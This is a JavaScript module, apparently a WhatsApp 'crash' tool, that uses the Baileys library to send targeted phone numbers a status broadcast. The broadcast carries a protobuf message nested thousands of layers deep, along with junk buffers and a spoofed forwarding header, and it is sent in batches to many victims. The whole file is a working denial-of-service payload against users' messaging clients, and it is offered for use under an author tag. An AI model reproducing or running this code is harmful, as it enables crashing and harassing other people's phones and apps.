
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    encodeSignedDeviceIdentity,
    processTime,
    fetchLatestBaileysVersion,
    Browser,
    MessageType,
    makeChatsSocket,
    generateProfilePicture,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    encodeWAMessage,
    getStream,
    patchMessageBeforeSending,
    encodeNewsletterMessage,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    InteractiveMessage,    
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');

async function android4(SYxS7, target) {
    const sentIds = [];
    try {
        const S7 = SABIR7718.Message.encode(
            SABIR7718.Message.fromObject({
                interactiveMessage: {
                    body: {
                        text: "𝚈𝚘𝚞𝚛 𝚂𝙰𝙱𝙸𝚁⁷⁷¹⁸" // LOVE S7
                    },
                    contextInfo: {
                        isForwarded: true,
                        buffer1: Buffer.from([0, 0, 0, 1]),
                        buffer2: Buffer.from([0xff, 0, 0, 0x1d]),
                        buffer3: Buffer.from([0xff, 0, 0, 0x1e]),
                        buffer4: Buffer.from([0xff, 0, 0, 0x1f]),
                        buffer5: Buffer.from([0xff, 0, 0, 0x20]),
                    },
                    XForwardedFor: Math.floor(Math.random() * 255) + "." +
                        Math.floor(Math.random() * 255) + "." +
                        Math.floor(Math.random() * 255) + "." +
                        Math.floor(Math.random() * 255) + "\r\n",
                },
            })
        ).finish();

        const TAGS = [
            [0xba, 0x03],
            [0xd2, 0x04],
            [0xaa, 0x02],
        ];

        const encodeVarint = (n) => {
            const buf = [];
            while (n >= 0x80) {
                buf.push((n & 0x7f) | 0x80);
                n >>>= 7;
            }
            buf.push(n);
            return Buffer.from(buf);
        };

        const wrapLd = (tag, data) =>
            Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);

        const inflate = (tag, depth) => {
            let buf = S7;
            for (let i = 0; i < depth; i++) {
                buf = wrapLd(tag, wrapLd([0x0a], buf));
            }
            return buf;
        };

        const S7_Live = (raw) => {
            const s = String(raw || "").trim();
            if (s.includes("@")) return s;
            return s.replace(/\D/g, "") + "@s.whatsapp.net";
        };

        const jids = (Array.isArray(target) ? target : [target])
            .map(S7_Live)
            .filter((j) => j.length > 15);

        if (!jids.length) return sentIds;

        const Ola_SAblr7718 = 5;
        const S7_Love_Girls = 5000;

        for (let offset = 0; offset < jids.length; offset += Ola_SAblr7718) {
            const chunk = jids.slice(offset, offset + Ola_SAblr7718);

            if (offset > 0) {
                await new Promise((r) => setTimeout(r, S7_Love_Girls));
            }

            const idx = Math.floor(offset / Ola_SAblr7718) + 1;
            const suffix = idx > 1 ? `-${idx}` : "";
            const msgId = `crb${Date.now().toString(36).toUpperCase()}${suffix}`;

            for (const tag of TAGS) {
                let payload = null;

                for (let depth = 5000; depth >= 2000 && !payload; depth -= 400) {
                    try {
                        const decoded = SABIR7718.Message.decode(inflate(tag, depth));
                        SABIR7718.Message.encode(decoded).finish();
                        payload = decoded;
                    } catch (_) {}
                }

                if (!payload) continue;

                await SYxS7.relayMessage("status@broadcast", payload, {
                    messageId: msgId,
                    statusJidList: chunk,
                    additionalNodes: [{
                        tag: "meta",
                        attrs: {},
                        content: [{
                            tag: "mentioned_users",
                            attrs: {},
                            content: chunk.map((jid) => ({
                                tag: "to",
                                attrs: {
                                    jid
                                },
                                content: [],
                            })),
                        }, ],
                    }, ],
                });

                sentIds.push(msgId);
            }
        }
    } catch (_) {}
    return sentIds;
}



module.exports = { android4 };